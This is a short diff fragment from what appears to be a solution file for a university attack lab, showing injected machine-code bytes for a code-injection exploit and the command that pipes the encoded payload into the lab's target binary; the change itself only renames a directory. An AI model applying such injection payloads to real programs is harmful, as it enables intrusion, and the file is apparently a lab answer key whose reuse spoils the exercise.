@@ -38,7 +38,7 @@ Suppose the cookie value is stored starting from 0x5561dca8.
 68 ec 17 40 00       	pushq  $0x4017ec
 c3                   	retq
 
-./hex2raw < level2/level2_CI_solution.txt | ./ctarget -q
+./hex2raw < CI_level2/level2_CI_solution.txt | ./ctarget -q
 */
 
 /*
